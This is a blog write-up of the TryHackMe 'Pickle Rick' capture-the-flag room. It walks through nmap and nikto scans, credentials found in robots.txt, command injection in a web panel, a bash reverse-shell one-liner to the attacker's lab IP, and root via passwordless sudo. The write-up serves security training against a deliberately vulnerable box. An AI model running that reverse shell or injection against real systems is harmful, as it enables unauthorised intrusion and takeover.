---
title: "TryHackMe: Pickle Rick"
date: 2020-11-11 00:00:00 +/-TTTT
categories: [Writeups, TryHackMe, easy]
tags: [tryhackme, easy]     # TAG names should always be lowercase
---

> **Title**: Pickle Rick
>
>**Platform**: TryHackMe
>
>**Difficulty**: Easy
>
>**Objective**: Root the box and gain access to the three ingredients to turn Rick back into a human from a pickle.

<img src= "https://tryhackme-images.s3.amazonaws.com/room-icons/47d2d3ade1795f81a155d0aca6e4da96.jpeg" width="250" height="250" > <br>

[Challenge Link](https://tryhackme.com/room/picklerick)

 > [!NOTE]
 This writeup does not divulge the flags.

I am a big Rick & Morty fan so this was the natural first pick to kick off the write ups! Let’s get **Schwiftyyyyyyyy…**

## Enumeration

Let’s begin with our favorite tool in the whole wide world..`NMAP`!

```js
root@ip-10-10-2-8:~# nmap -sS 10.10.238.189

Starting Nmap 7.60 ( <https://nmap.org> ) at 2023-12-28 20:40 GMT
Nmap scan report for ip-10-10-238-189.eu-west-1.compute.internal (10.10.238.189)
Host is up (0.00064s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:A3:0A:ED:E4:EB (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.73 seconds
```

And with a few other switches..

```javascript
root@ip-10-10-2-8:~# nmap -sC -sV 10.10.238.189

Starting Nmap 7.60 ( <https://nmap.org> ) at 2023-12-28 20:41 GMT
Nmap scan report for ip-10-10-238-189.eu-west-1.compute.internal (10.10.238.189)
Host is up (0.00059s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ca:29:35:20:59:12:22:6d:b5:9e:71:a9:13:ae:74:c1 (RSA)
|   256 4d:ad:85:45:39:1f:4e:e4:c5:f5:27:14:57:d3:81:fd (ECDSA)
|_  256 ff:d6:fd:35:1d:6e:2b:e8:66:8b:33:20:eb:b2:f4:35 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:A3:0A:ED:E4:EB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds
```

Navigating to Port 80 we are greeted with Grandpa RICK

![image](https://cdn.hashnode.com/res/hashnode/image/upload/v1705527366805/b4a313e6-97de-49cc-ab3f-4243af9103a7.png)

Viewing the source of the `index.html` page we see the following

![image2](https://cdn.hashnode.com/res/hashnode/image/upload/v1705527391473/f6847fe0-61a7-4fb2-b44b-f3c37d9137c0.png)

Now let’s enumerate the usual suspects using `nikto`

```javascript
root@ip-10-10-2-8:~# nikto -h <http://10.10.238.189>
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.238.189
+ Target Hostname:    ip-10-10-238-189.eu-west-1.compute.internal
+ Target Port:        80
+ Start Time:         2023-12-28 20:44:37 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x426 0x5818ccf125686 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2023-12-28 20:44:47 (GMT0) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

* `robots.txt`
    
    I couldn’t stop laughing when I saw the entry
    
    ![image3](https://cdn.hashnode.com/res/hashnode/image/upload/v1705527420086/9bb35c2a-bf34-4351-b62e-833c0c7a0da7.png)
    
* `login.php`
    
    Let’s try a few standard combinations for usernames and passwords
    

![image4](https://cdn.hashnode.com/res/hashnode/image/upload/v1705527440172/6d9a96d0-79f7-4802-8d13-b367a7d3c0ab.png)

Username found earlier with the `robots.txt` entry combination works and we are in!

We are now logged into a `portal.php`

![image5](https://cdn.hashnode.com/res/hashnode/image/upload/v1705527456037/e5603924-17d9-47fa-8b09-b628685f1fb2.png)

All the other tabs redirect to `denied.php` so we will investigate the command panel with something simple for a command injection

`Cat` the first one doesn’t work and we get a Command disabled message so let’s look at the `clue.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1705527470931/acaa5158-d97b-4a2c-b333-37cbb0d550ca.png)

`Cat` and `tail` and similar commands do not work but we notice that `grep` works, now we use a shwifty little trick to read the text file like so

```jsx
grep -v "test" filename
```

Voila! We have our first ingredient!

## I Smell a Shell Morty!

Let’s try to pop a shell and we see we get a similar response with `sh` and a few moments later this works

```bash
bash -c 'sh -i >& /dev/tcp/10.10.2.8/4444 0>&1'
```

We read the `clue.txt` and go to `/home` and we see the second ingredient folder and go grab it.

You don't necessarily need to pop a shell, you can get by with command injection in the panel we saw earlier but shells are fun and I like poppin' them.

## One Step Closer....All powerful Root!

Now for the final ingredient which is root probably we see that the user `www-data`has sudo access and we run sudo -l to see what privileges our user has.

```bash
(ALL) NOPASSWD: ALL
```

Don't we just love when this happens?

```bash
sudo -i
```

We are root!

Head to the root directory and we have our final ingredient.

That's all for today folks, see you on the next one!